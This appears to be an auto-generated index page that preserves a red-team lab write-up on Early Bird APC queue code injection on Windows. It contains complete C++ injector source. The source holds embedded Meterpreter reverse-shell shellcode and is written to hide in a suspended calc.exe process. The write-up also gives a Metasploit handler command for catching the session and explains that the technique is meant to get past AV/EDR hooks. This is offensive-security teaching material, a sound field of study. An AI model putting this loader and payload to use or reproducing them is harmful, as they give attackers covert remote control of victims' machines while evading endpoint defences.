---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Early Bird APC Queue Code Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-injection-process-injection-early-bird-apc-queue-code-injection` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Early Bird APC Queue Code Injection](../../topics/offensive-security/early-bird-apc-queue-code-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-injection-process-injection-early-bird-apc-queue-code-injection |
| name | Early Bird APC Queue Code Injection |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Annotation 2019-05-27 140139.png
- Annotation 2019-05-27 140326.png
- apc-meterpreter.gif
- writing-shellcode.gif
_body: "# Early Bird APC Queue Code Injection\n\nThis short lab is related to a different version of the APC queue code injection\
  \ technique I tinkered with here:\n\n{% content-ref url=\"apc-queue-code-injection.md\" %}\n[apc-queue-code-injection.md](apc-queue-code-injection.md)\n\
  {% endcontent-ref %}\n\n## Overview\n\nHigh level overview of the technique:\n\n1. A malicious program creates a new legitimate\
  \ process (say calc.exe) in a suspended state\n2. Memory for shellcode is allocated in the newly created process's memory\
  \ space\n3. APC routine pointing to the shellcode is declared\n4. Shellcode is written to the previously allocated memory\n\
  5. APC is queued to the main thread (currently in `suspended` state)\n6. Thread is resumed and the shellcode is executed\n\
  7. Meterpreter session established\n\nOne of the main advantages of this technique over the regular APC Queue code injection,\
  \ is that in Early Bird technique, the malicious behaviour takes place early on in the process initialization phase, increasing\
  \ the likelihood of going under the radar of some AV/EDR hooks.\n\n## Execution\n\nBelow image (top) shows that I've hit\
  \ the breakpoint on line 19, meaning that a new `calc.exe` process has been created in a `suspended` state (defined in line\
  \ 15).\n\nIf we check the newly started `calc.exe` in the Process Hacker, we can confirm that the main thread is indeed\
  \ `suspended` (bottom):\n\n![](<../../.gitbook/assets/Annotation 2019-05-27 140139.png>)\n\nAfter line 19 is executed, we\
  \ get the address of the newly allocated memory. This is where the shellcode will be written to:\n\n```cpp\nLPVOID shellAddress\
  \ = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n```\n\n![](<../../.gitbook/assets/Annotation\
  \ 2019-05-27 140326.png>)\n\nBelow shows how the shellcode gets written to memory address `0000023b82480000` of the `calc.exe`\
  \ with:\n\n```cpp\nWriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);\n```\n\n![](../../.gitbook/assets/writing-shellcode.gif)\n\
  \nBefore continuing, let's fire up a multi handler on the attacking system so we can catch the meterpreter session:\n\n\
  {% code title=\"attacker@kali\" %}\n```csharp\nmsfconsole -x \"use exploits/multi/handler; set lhost 10.0.0.5; set lport\
  \ 443; set payload windows/x64/meterpreter/reverse_tcp; exploit\"\n```\n{% endcode %}\n\nBack to executing the malicious\
  \ code - once the shellcode is written into the process memory, the APC is queued to the thread which is then immediately\
  \ resumed. Resuming the thread in turn executes the shellcode which results in a meterpreter session:\n\n![](../../.gitbook/assets/apc-meterpreter.gif)\n\
  \n## Code\n\n{% code title=\"earlybird-apc.cpp\" %}\n```cpp\n#include \"pch.h\"\n#include <Windows.h>\n\nint main()\n{\n\
  \tunsigned char buf[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\\
  xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\\
  x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\\
  x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\\x85\\x72\\x00\\x00\\x00\\x8b\\x80\\\
  x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\\
  x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\\
  xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\\
  x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\\
  x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x4b\\\
  xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\\x00\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\\
  x00\\x00\\x49\\x89\\xe5\\x49\\xbc\\x02\\x00\\x01\\xbb\\x0a\\x00\\x00\\x05\\x41\\x54\\x49\\x89\\xe4\\x4c\\x89\\xf1\\x41\\\
  xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\x68\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\\
  x6a\\x0a\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\\
  x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba\\x99\\\
  xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\x49\\xff\\xce\\x75\\xe5\\xe8\\x93\\x00\\x00\\x00\\x48\\x83\\xec\\x10\\x48\\\
  x89\\xe2\\x4d\\x31\\xc9\\x6a\\x04\\x41\\x58\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7e\\\
  x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41\\x59\\x68\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\\
  xc9\\x41\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\\
  x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x41\\x57\\x59\\x68\\x00\\x40\\x00\\\
  x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\xba\\x0b\\x2f\\x0f\\x30\\xff\\xd5\\x57\\x59\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\\
  x49\\xff\\xce\\xe9\\x3c\\xff\\xff\\xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\\x85\\xf6\\x75\\xb4\\x41\\xff\\xe7\\x58\\x6a\\\
  x00\\x59\\x49\\xc7\\xc2\\xf0\\xb5\\xa2\\x56\\xff\\xd5\";\n\tSIZE_T shellSize = sizeof(buf);\n\tSTARTUPINFOA si = {0};\n\t\
  PROCESS_INFORMATION pi = {0};\n\n\tCreateProcessA(\"C:\\\\Windows\\\\System32\\\\calc.exe\", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,\
  \ NULL, NULL, &si, &pi);\n\tHANDLE victimProcess = pi.hProcess;\n\tHANDLE threadHandle = pi.hThread;\n\t\n\tLPVOID shellAddress\
  \ = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\tPTHREAD_START_ROUTINE apcRoutine\
  \ = (PTHREAD_START_ROUTINE)shellAddress;\n\t\n\tWriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);\n\
  \tQueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);\t\n\tResumeThread(threadHandle);\n\n\treturn 0;\n}\n```\n{% endcode\
  \ %}\n\n## References\n\n{% embed url=\"https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/\"\
  \ %}\n\n{% embed url=\"https://www.youtube.com/watch?time_continue=29&v=_sI76NLPMjI\" %}"
_relative_path: offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection.md
````
